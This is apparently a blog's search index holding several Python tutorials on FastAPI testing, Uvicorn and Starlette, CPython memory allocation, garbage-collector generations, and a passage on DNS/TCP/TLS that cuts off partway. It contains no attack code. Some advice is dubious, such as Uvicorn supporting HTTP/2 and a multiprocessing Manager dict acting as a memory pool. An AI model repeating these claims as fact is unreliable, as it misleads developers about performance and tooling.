client2\n</code></pre>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#common-issues-with-multiple-instances","title":"Common Issues with Multiple Instances","text":"<ol> <li>State Inconsistency : Shared state (like <code>database</code>) will behave independently in different app instances.</li> <li>Multiple Dependency Initializations : Dependencies like database connections may be initialized multiple times, leading to resource exhaustion.</li> <li>Startup/Shutdown Event Overlap : Multiple app instances trigger these events independently, causing redundant or conflicting behavior.</li> </ol>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#best-practices","title":"Best Practices","text":""},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#structure-your-project-for-reuse","title":"Structure Your Project for Reuse","text":"<p>Create your app in a dedicated file (e.g., <code>app.py</code>) and import it where needed.</p> <pre><code># app.py  \nfrom fastapi import FastAPI\n\napp = FastAPI()  \n# Add routes here\n\n\n# main.py  \nfrom fastapi.testclient import TestClient  \nfrom app import app\n\nclient = TestClient(app)\n</code></pre>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#use-pytest-fixtures-for-shared-instances","title":"Use <code>pytest</code> Fixtures for Shared Instances","text":"<p>Fixtures in <code>pytest</code> help manage shared resources like the <code>TestClient</code>:</p> <pre><code>import pytest  \nfrom fastapi.testclient import TestClient  \nfrom app import app\n\n@pytest.fixture(scope=\"module\")  \ndef test_client():  \n    client = TestClient(app)  \n    yield client  # Ensure cleanup\n\ndef test_example(test_client):  \n    response = test_client.get(\"/items/\")  \n    assert response.status_code == 200\n</code></pre>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#relevant-documentation","title":"Relevant Documentation","text":"<ul> <li>Starlette TestClient</li> <li>Testing with FastAPI</li> <li>pytest Fixtures</li> </ul> <p>By following these guidelines, you ensure your FastAPI project is consistent, efficient, and maintainable.</p>"},{"location":"blog/old-blogs/2025-01-20_Why-You-Should-Use-a-Single-FastAPI-App-and-TestClient-Instance-475ab3a99cce/#thank-you-for-being-a-part-of-the-community","title":"Thank you for being a part of the community","text":"<p>Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X | LinkedIn | YouTube | Newsletter | Podcast</li> <li>Check out CoFeed, the smart way to stay up-to-date with the latest in tech \ud83e\uddea</li> <li>Start your own free AI-powered blog on Differ \ud83d\ude80</li> <li>Join our content creators community on Discord \ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb</li> <li>For more content, visit plainenglish.io + stackademic.com</li> </ul> <p>By Kfir Gisman on January 20, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/","title":"Do You Really Know About FastAPI and ASGI?","text":"<p>Uvicorn is a high-performance ASGI server, and Starlette provides core tools for routing, middleware, and WebSockets. </p>"},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/#do-you-really-know-about-fastapi-and-asgi_1","title":"Do You Really Know About FastAPI and ASGI?","text":""},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/#before-uvicorn-and-starlette-how-did-synchronous-servers-work","title":"Before Uvicorn and Starlette: How Did Synchronous Servers Work?","text":"<p>In traditional web development, servers like WSGI (Web Server Gateway Interface) were used to bridge web applications and HTTP servers. Frameworks like Flask and Django rely on WSGI servers (e.g., Gunicorn) to handle incoming requests. However, WSGI servers are synchronous by design, meaning:</p> <ol> <li>Blocking I/O : Each request blocks a worker thread until it completes, making it inefficient for handling high-concurrency scenarios like WebSockets or long-lived requests.</li> <li>Scalability Challenges : Scaling required adding more threads or processes, which increased resource consumption.</li> </ol> <p>To address these limitations, the ASGI (Asynchronous Server Gateway Interface) standard was introduced. ASGI enables asynchronous, non-blocking communication, making it ideal for modern applications requiring WebSockets, HTTP/2, or other real-time capabilities.</p>"},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/#the-arrival-of-uvicorn-and-starlette","title":"The Arrival of Uvicorn and Starlette","text":"<p>FastAPI is built on top of Uvicorn and Starlette , each serving distinct but complementary roles. Let\u2019s dive into their purposes and benefits.</p>"},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/#1-uvicorn-the-asgi-server","title":"1. Uvicorn: The ASGI Server","text":"<p>Uvicorn is an ASGI server that runs FastAPI applications. It\u2019s responsible for:</p> <ul> <li>Handling HTTP requests : Uvicorn receives incoming HTTP/HTTPS requests and routes them to the application.</li> <li>Asynchronous I/O : Designed to handle asynchronous calls efficiently, making it faster and more scalable than synchronous servers.</li> <li>Protocols Supported :</li> <li>HTTP/1.1, HTTP/2</li> <li>WebSockets</li> <li>Production Readiness : Uvicorn\u2019s speed and lightweight design make it suitable for production environments.</li> </ul> <p>Benefits of Uvicorn</p> <ul> <li>High performance with event-driven architecture using uvloop (an optimized event loop for Python).</li> <li>Native support for WebSockets and HTTP/2.</li> <li>Minimal overhead for asynchronous applications.</li> </ul> <p>How to Use Uvicorn</p> <p>Here\u2019s an example of running a FastAPI app with Uvicorn:</p> <pre><code>uvicorn main:app --host 0.0.0.0 --port 8000\n</code></pre> <p>You can also run it programmatically:</p> <pre><code>import uvicorn\n\nif __name__ == \"__main__\":  \n    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000, reload=True)\n</code></pre>"},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/#2-starlette-the-asgi-framework","title":"2. Starlette: The ASGI Framework","text":"<p>Starlette is a lightweight ASGI framework that provides the core functionality for FastAPI. It offers tools and utilities for building web applications, including:</p> <ul> <li>Routing : Map URLs to Python functions or classes.</li> <li>Middleware : Add layers to process requests/responses (e.g., authentication, logging).</li> <li>Background Tasks : Execute tasks outside the request/response cycle.</li> <li>WebSockets : Enable real-time communication with clients.</li> <li>Testing Utilities : Simplifies testing with an integrated testing client.</li> </ul> <p>Benefits of Starlette</p> <ul> <li>Modular and flexible design, making it a great foundation for frameworks like FastAPI.</li> <li>Built-in support for async programming, allowing efficient resource utilization.</li> <li>Comprehensive documentation and active community support.</li> </ul> <p>How to Use Starlette</p> <p>While you rarely interact directly with Starlette in FastAPI, you can use it independently to build minimal web applications. Here\u2019s an example:</p> <pre><code>from starlette.applications import Starlette  \nfrom starlette.responses import JSONResponse  \nfrom starlette.routing import Route\n\nasync def homepage(request):  \n    return JSONResponse({\"message\": \"Hello from Starlette!\"})  \napp = Starlette(debug=True, routes=[  \n    Route('/', homepage)  \n])\n</code></pre> <p>Run this app with Uvicorn:</p> <pre><code>uvicorn app:app --reload\n</code></pre>"},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/#differences-between-uvicorn-and-starlette","title":"Differences Between Uvicorn and Starlette","text":"<p>Feature Uvicorn Starlette Category ASGI server ASGI framework Purpose Runs the application Provides core web framework features Focus Handles request/response lifecycle Routing, middleware, WebSockets, etc. Interaction Runs FastAPI apps Forms the foundation of FastAPI</p>"},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/#putting-it-together-understanding-uvicorn-and-starlette-in-fastapi","title":"Putting It Together: Understanding Uvicorn and Starlette in FastAPI","text":"<p>FastAPI combines the best of Uvicorn and Starlette:</p> <ul> <li>Uvicorn : Ensures high performance by handling the execution of the application.</li> <li>Starlette : Powers FastAPI\u2019s core functionalities, such as routing, middleware, and WebSocket support.</li> </ul> <p>As a developer, understanding the roles of Uvicorn and Starlette helps you:</p> <ul> <li>Optimize your application for performance (e.g., tuning Uvicorn settings for production).</li> <li>Leverage Starlette\u2019s utilities when building custom features.</li> </ul> <p>By appreciating their distinct yet interconnected roles, you can make more informed decisions when building or deploying FastAPI applications.</p>"},{"location":"blog/old-blogs/2025-01-27_Do-You-Really-Know-About-FastAPI-and-ASGI--06582a8358bc/#thank-you-for-being-a-part-of-the-community","title":"Thank you for being a part of the community","text":"<p>Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X | LinkedIn | YouTube | Newsletter | Podcast</li> <li>Check out CoFeed, the smart way to stay up-to-date with the latest in tech \ud83e\uddea</li> <li>Start your own free AI-powered blog on Differ \ud83d\ude80</li> <li>Join our content creators community on Discord \ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb</li> <li>For more content, visit plainenglish.io + stackademic.com</li> </ul> <p>By Kfir Gisman on January 27, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/","title":"Memory Allocation in Python: Understanding Arenas, Pools, and Blocks","text":"<p>Python handles memory behind the scenes, but understanding it can make your code faster. Learn about arenas, pools, and blocks with\u2026 </p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#memory-allocation-in-python-understanding-arenas-pools-and-blocks_1","title":"Memory Allocation in Python: Understanding Arenas, Pools, and Blocks","text":"<p>Photo by Andre Moura: https://www.pexels.com/photo/people-riding-train-3363463/</p> <p>Python manages memory efficiently using an internal allocation system that prevents frequent calls to the operating system. This system is designed to optimize performance, reduce fragmentation, and ensure memory reuse where possible.</p> <p>In this post, we\u2019ll break down Python\u2019s memory allocation process using real-world examples, official documentation references, and practical code snippets.</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#1-pythons-memory-allocation-strategy","title":"1\ufe0f\u20e3 Python\u2019s Memory Allocation Strategy","text":"<p>When you create objects in Python, memory is allocated in multiple layers:</p> <ol> <li>Blocks \u2192 Small memory units assigned to individual objects.</li> <li>Pools \u2192 Groups of blocks of similar sizes.</li> <li>Arenas \u2192 Large memory regions that hold multiple pools.</li> </ol>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#how-this-works-in-practice","title":"How This Works in Practice","text":"<p>Imagine you\u2019re running a web server that handles thousands of user sessions. Instead of allocating memory for each session separately, Python groups similar-sized objects together, reducing overhead and improving efficiency.</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#2-blocks-the-smallest-unit-of-memory","title":"2\ufe0f\u20e3 Blocks: The Smallest Unit of Memory","text":"<p>A block is the fundamental unit of memory allocation. When you create an object, Python assigns it a block. If the object is small (\u2264512 bytes), it gets stored in a pre-allocated block to avoid repeated memory requests.</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#example-memory-allocation-for-integers","title":"Example: Memory Allocation for Integers","text":"<pre><code>x = 100  \ny = 100\n\nprint(id(x), id(y))  # Same memory address\n</code></pre> <p>Since integers between <code>-5</code> and <code>256</code> are interned , Python reuses the same block for <code>x</code> and <code>y</code>.</p> <p>\ud83d\udcc4 Reference: Python Integer Objects</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#3-pools-grouping-blocks-for-efficiency","title":"3\ufe0f\u20e3 Pools: Grouping Blocks for Efficiency","text":"<p>A pool is a collection of blocks of the same size. Instead of allocating memory for each new object, Python keeps pools ready for reuse.</p> <p>\ud83d\udd39 Objects smaller than 512 bytes are stored in pools. \ud83d\udd39 Each pool contains blocks of the same size (8, 16, 32 bytes, etc.).</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#example-why-pools-matter-in-a-web-api","title":"Example: Why Pools Matter in a Web API","text":"<p>Consider an API that processes user data:</p> <pre><code>def process_request(user_data):  \n    user = {\"name\": user_data[\"name\"], \"age\": user_data[\"age\"]}    \n    return user\n</code></pre> <p>Each request creates a new dictionary , leading to multiple memory allocations.</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#better-approach-using-object-caching-reusing-memory","title":"Better Approach: Using Object Caching (Reusing Memory)","text":"<p>Instead of creating a new object each time, we can reuse objects efficiently:</p> <pre><code>import functools\n\n@functools.lru_cache(maxsize=1000)  \ndef get_user_template():  \n    return {\"name\": \"\", \"age\": 0}\n\ndef process_request(user_data):  \n    user = get_user_template().copy()  \n    user[\"name\"] = user_data[\"name\"]  \n    user[\"age\"] = user_data[\"age\"]  \n    return user\n</code></pre> <p>This approach reduces memory allocation by using a pre-allocated object structure.</p> <p>\ud83d\udcc4 Reference: Python Memory Management</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#4-arenas-the-backbone-of-pythons-memory-system","title":"4\ufe0f\u20e3 Arenas: The Backbone of Python\u2019s Memory System","text":"<p>An arena is a large 256 KB memory region that contains multiple pools. Instead of allocating small pieces of memory individually, Python requests a large block from the OS and distributes it as needed.</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#shared-memory-example-using-arenas-for-inter-process-data-sharing","title":"Shared Memory Example: Using Arenas for Inter-Process Data Sharing","text":"<pre><code>from multiprocessing import shared_memory  \nimport numpy as np\n\n# Create shared memory  \nshm = shared_memory.SharedMemory(create=True, size=1024)\n\n# Assign a NumPy array to this memory block  \narray = np.ndarray((256,), dtype=np.int32, buffer=shm.buf)  \narray[:] = np.arange(256)  \nprint(\"Shared Memory Name:\", shm.name)\n\n# Cleanup  \nshm.close()  \nshm.unlink()\n</code></pre> <p>Here, multiple processes can access shared memory without duplication , reducing memory usage.</p> <p>\ud83d\udcc4 Reference: PEP 3118 \u2014 Revising the buffer protocol</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#5-putting-it-all-together-memory-optimization-in-a-fastapi-server","title":"5\ufe0f\u20e3 Putting It All Together: Memory Optimization in a FastAPI Server","text":"<p>A real-world example of Python\u2019s memory allocation system is a FastAPI-based authentication service that manages sessions.</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#bad-approach-creating-new-session-objects-for-each-request","title":"Bad Approach: Creating New Session Objects for Each Request","text":"<pre><code>from fastapi import FastAPI\n\napp = FastAPI()  \nsessions = {}\n\n@app.get(\"/session/{user_id}\")  \ndef get_session(user_id: str):  \n    sessions[user_id] = {\"user_id\": user_id, \"data\": {}}  \n    return sessions[user_id]\n</code></pre> <p>Each request allocates new memory , leading to high memory usage.</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#optimized-approach-using-a-memory-pool-for-sessions","title":"Optimized Approach: Using a Memory Pool for Sessions","text":"<pre><code>from fastapi import FastAPI  \nfrom multiprocessing import Manager\n\napp = FastAPI()  \nsession_manager = Manager()  \nsessions = session_manager.dict()\n\n@app.get(\"/session/{user_id}\")  \ndef get_session(user_id: str):  \n    if user_id not in sessions:  \n        sessions[user_id] = {\"user_id\": user_id, \"data\": {}}  \n    return sessions[user_id]\n</code></pre> <p>By using a shared memory dictionary , Python reuses objects instead of allocating new ones for each request.</p> <p>\ud83d\udcc4 Reference: FastAPI Performance Guide</p>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Blocks are the smallest memory units, allocated for objects.</li> <li>Pools group blocks of the same size, preventing fragmentation.</li> <li>Arenas allocate large memory chunks to reduce OS calls.</li> <li>Optimized memory usage is crucial for high-performance applications.</li> </ul> <p>\ud83d\udcc4 Further Reading:</p> <ul> <li>Python Memory Management Docs</li> <li>PEP 445 \u2014 Customization of Python Memory Allocators</li> </ul>"},{"location":"blog/old-blogs/2025-03-10_Memory-Allocation-in-Python--Understanding-Arenas--Pools--and-Blocks-87024446c93e/#thank-you-for-being-a-part-of-the-community","title":"Thank you for being a part of the community","text":"<p>Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X | LinkedIn | YouTube | Newsletter | Podcast | Differ</li> <li>Check out CoFeed, the smart way to stay up-to-date with the latest in tech \ud83e\uddea</li> <li>Start your own free AI-powered blog on Differ \ud83d\ude80</li> <li>Join our content creators community on Discord \ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb</li> <li>For more content, visit plainenglish.io + stackademic.com</li> </ul> <p>By Kfir Gisman on March 10, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/","title":"The Three Generations in Python\u2019s Garbage Collector","text":"<p>How Python\u2019s GC Classifies Objects Into Generations- Objects are grouped by age to make garbage collection more efficient. </p>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#the-three-generations-in-pythons-garbage-collector_1","title":"The Three Generations in Python\u2019s Garbage Collector","text":"<p>Photo by Willian Santos: https://www.pexels.com/photo/relaxed-beach-scene-with-vintage-camera-statue-28467843/</p> <p>Python\u2019s garbage collector (GC) follows a generational model to optimize memory management. Instead of scanning all objects every time, it organizes them into three generations based on their lifespan. This approach is built on the generational hypothesis , which assumes:</p> <ol> <li>Most objects are short-lived and should be collected frequently.</li> <li>Long-lived objects are rarely garbage and should be checked less often.</li> </ol> <p>By structuring garbage collection this way, Python reduces overhead while efficiently reclaiming memory. This guide explores how these generations work, when GC runs, and how to fine-tune it for better performance.</p>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#1-the-three-generations-of-pythons-gc","title":"1\ufe0f\u20e3 The Three Generations of Python\u2019s GC","text":"<p>Every object created in Python starts in Generation 0 and moves to older generations if it survives multiple GC runs.</p>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#generation-0-young-objects-collected-often","title":"Generation 0 (Young Objects)- Collected Often","text":"<ul> <li>This is the first place where new objects are allocated.</li> <li>These objects are collected frequently because most of them are short-lived.</li> <li> <p>Example of short-lived objects:</p> <p>def create_temp_object():        data = {\u201cname\u201d: \u201cTemp\u201d}  # Created inside a function        return data              # Often discarded quickly</p> </li> <li> <p>Once an object survives a GC cycle , it moves to Generation 1.</p> </li> </ul>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#generation-1-medium-lived-objects-collected-less-often","title":"Generation 1 (Medium-lived Objects) \u2014 Collected Less Often","text":"<ul> <li>Objects that survived at least one collection in Gen 0 move here.</li> <li>The assumption is that these objects are more likely to be used for a longer time.</li> <li>Gen 1 is collected less frequently than Gen 0.</li> <li> <p>Example:</p> <p>cached_data = {\u201cuser\u201d: \u201cJohn\u201d}  # Used multiple times but not forever</p> </li> <li> <p>If an object continues to survive , it moves to Generation 2.</p> </li> </ul>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#generation-2-long-lived-objects-rarely-collected","title":"Generation 2 (Long-lived Objects)- Rarely Collected","text":"<ul> <li>Objects that survive multiple GC cycles end up in Gen 2.</li> <li>These objects are assumed to be important and necessary for the program.</li> <li>Gen 2 is collected the least frequently because it contains objects that have already survived several rounds.</li> <li> <p>Example:</p> <p>class DatabaseConnection:        def init(self):              self.connection = \u201cConnected\u201d    </p> <p>db = DatabaseConnection()  # Global object, used throughout the program</p> </li> <li> <p>Global variables, class instances, and modules often stay in Gen 2.</p> </li> </ul>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#2-how-do-generations-interact","title":"2\ufe0f\u20e3 How Do Generations Interact?","text":"<p>Each generation has a threshold that determines when GC runs. You can check these values using:</p> <pre><code>import gc  \nprint(gc.get_threshold())  # (700, 10, 10) by default\n</code></pre> <p>This means:</p> <ol> <li>Gen 0 triggers collection after 700 new objects are created.</li> <li>Gen 1 runs every 10 Gen 0 collections.</li> <li>Gen 2 runs every 10 Gen 1 collections.</li> </ol>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#example-workflow","title":"Example Workflow:","text":"<ul> <li>Your program creates 700 new objects \u2192 GC runs for Gen 0.</li> <li>If an object survives one Gen 0 collection , it moves to Gen 1.</li> <li>After 10 Gen 0 collections , Gen 1 is checked.</li> <li>After 10 Gen 1 collections , Gen 2 is checked.</li> </ul>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#3-controlling-garbage-collection","title":"3\ufe0f\u20e3 Controlling Garbage Collection","text":""},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#checking-how-many-objects-are-in-each-generation","title":"Checking How Many Objects Are in Each Generation","text":"<p>You can see the number of objects currently in each generation using:</p> <pre><code>print(gc.get_count())  # Example output: (450, 25, 5)\n</code></pre> <p>This means:</p> <ul> <li>450 objects in Gen 0</li> <li>25 objects in Gen 1</li> <li>5 objects in Gen 2</li> </ul>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#manually-running-garbage-collection","title":"Manually Running Garbage Collection","text":"<p>If you want to force a collection , you can use:</p> <pre><code>gc.collect()  # Collects all generations  \ngc.collect(0)  # Collects only Generation 0  \ngc.collect(1)  # Collects Generation 0 and 1  \ngc.collect(2)  # Collects all three generations\n</code></pre>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#adjusting-collection-frequency","title":"Adjusting Collection Frequency","text":"<p>If your program creates many objects quickly , you might want to tune GC thresholds :</p> <pre><code>gc.set_threshold(1000, 20, 20)  # Increase thresholds to reduce GC runs\n</code></pre>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#when-should-you-change-these","title":"When Should You Change These?","text":"<ul> <li>If your program creates and destroys objects rapidly (e.g., web servers, data processing).</li> <li>If you notice performance slowdowns due to frequent GC runs.</li> </ul>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#4-real-world-example-optimizing-memory-in-fastapi","title":"4\ufe0f\u20e3 Real-World Example: Optimizing Memory in FastAPI","text":""},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#problem-too-many-objects-in-memory","title":"Problem: Too Many Objects in Memory","text":"<p>A FastAPI app creates too many short-lived request objects , increasing Gen 0 collections.</p> <pre><code>from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/\")  \nasync def home():  \n    data = {\"message\": \"Hello\"}  # This gets created and discarded every request  \n    return data\n</code></pre> <p>Issue: Every request creates a new dictionary, filling up Gen 0 quickly.</p>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#solution-reuse-objects-when-possible","title":"Solution: Reuse Objects When Possible","text":"<pre><code>cached_response = {\"message\": \"Hello\"}  # Store as a long-lived object\n\n@app.get(\"/\")  \nasync def home():  \n    return cached_response  # Uses existing object instead of creating new ones\n</code></pre> <p>Benefit: This reduces GC pressure by preventing unnecessary object creation.</p>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#5-key-takeaways","title":"5\ufe0f\u20e3 Key Takeaways","text":"<ul> <li>Python\u2019s GC has three generations (0, 1, 2).</li> <li>Gen 0 is collected most frequently, Gen 2 the least.</li> <li>Objects move between generations based on survival.</li> <li>GC runs based on threshold values (<code>**gc.get_threshold()**</code>).</li> <li>You can manually trigger (<code>**gc.collect()**</code>) or tune (<code>**gc.set_threshold()**</code>) the GC.</li> <li>Optimizing object reuse helps reduce GC pressure.</li> </ul>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#further-reading","title":"Further Reading","text":"<ul> <li>Python Garbage Collection Docs</li> </ul>"},{"location":"blog/old-blogs/2025-03-17_The-Three-Generations-in-Python-s-Garbage-Collector-13a76e895e72/#thank-you-for-being-a-part-of-the-community","title":"Thank you for being a part of the community","text":"<p>Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X | LinkedIn | YouTube | Newsletter | Podcast | Differ</li> <li>Check out CoFeed, the smart way to stay up-to-date with the latest in tech \ud83e\uddea</li> <li>Start your own free AI-powered blog on Differ \ud83d\ude80</li> <li>Join our content creators community on Discord \ud83e\uddd1\ud83c\udffb\u200d\ud83d\udcbb</li> <li>For more content, visit plainenglish.io + stackademic.com</li> </ul> <p>By Kfir Gisman on March 17, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/","title":"What Really Happens When You Type google.com in Your Browser?","text":"<p>From URL to Webpage: A Deep Dive into DNS, TCP, TLS, and HTTP </p>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#what-really-happens-when-you-type-googlecom-in-your-browser_1","title":"What Really Happens When You Type <code>google.com</code> in Your Browser?","text":"<p>Photo by Thiago Matos : https://www.pexels.com/photo/colorful-ferris-wheel-against-cloudy-sky-30342870/</p> <p>Every time you type <code>google.com</code> into your browser\u2019s address bar and press Enter, a complex sequence of events unfolds behind the scenes. This post will break down each step in detail with Python examples and references to official documentation.</p>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#1-domain-name-resolution-dns-lookup","title":"1. Domain Name Resolution (DNS Lookup)","text":"<p>Before your browser can connect to Google\u2019s servers, it needs the IP address corresponding to <code>google.com</code>. This process is called DNS resolution.</p>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#how-it-works","title":"How it Works:","text":"<ol> <li>The browser first checks its DNS cache to see if the domain has been resolved recently.</li> <li>If not found, it queries the OS\u2019s DNS resolver.</li> <li>If still unresolved, the OS sends a request to a recursive DNS server (provided by your ISP or a third-party like Google\u2019s <code>8.8.8.8</code>).</li> <li>The recursive DNS server queries root name servers \u2192 TLD name servers (<code>.com</code>) \u2192 Authoritative name servers for <code>google.com</code>.</li> <li>The authoritative name server provides the IP address (e.g., <code>142.250.184.14</code>).</li> <li>The response is cached for future queries.</li> </ol> <p>\ud83d\udd17 Official Docs:</p> <ul> <li>IETF RFC 1034 \u2014 DNS Concepts</li> <li>Google Public DNS</li> </ul>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#python-code-for-dns-resolution","title":"Python Code for DNS Resolution:","text":"<pre><code>import socket\n\ndomain = \"google.com\"  \nip = socket.gethostbyname(domain)  \nprint(f\"Resolved {domain} to {ip}\")\n</code></pre>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#2-establishing-a-tcp-connection","title":"2. Establishing a TCP Connection","text":"<p>Once the IP is known, the browser establishes a TCP connection using the three-way handshake :</p> <ol> <li>SYN : The client sends a TCP packet with the SYN flag set.</li> <li>SYN-ACK : The server responds with a packet containing SYN and ACK flags.</li> <li>ACK : The client acknowledges and the connection is established.</li> </ol> <p>\ud83d\udd17 Official Docs:</p> <ul> <li>IETF RFC 793 \u2014 TCP Protocol</li> <li>Linux TCP/IP Networking Guide</li> </ul>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#python-code-for-tcp-connection","title":"Python Code for TCP Connection:","text":"<pre><code>import ssl, socket\n\ncontext = ssl.create_default_context()  \nsock = socket.create_connection((ip, 443))  # HTTPS uses port 443  \nsecure_sock = context.wrap_socket(sock, server_hostname=domain)  \nprint(\"TCP connection established with Google\")\n</code></pre>"},{"location":"blog/old-blogs/2025-03-30_What-Really-Happens-When-You-Type-google-com-in-Your-Browser--c33e8c2e6eed/#3-tls-handshake-secure-connection","title":"3. TLS Handshake &amp; Secure Connection","text":"<p>Since Google uses HTTPS, an additional TLS handshake takes place:</p> <ol> <li>Client Hello : The browser sends supported encryption protocols.</li> <li>Server Hello : The server responds with a chosen encryption algorithm.</li> <li>Certificate Exchange : The server provides an SSL certificate for verification.</li> <li>Key Exchange : Both parties establish an encrypted communication channel.</li> </ol> <p>\ud83d\udd17 Official Docs:</p> <ul> <li>IETF RFC 8446 \u2014 TLS 1.3</li> 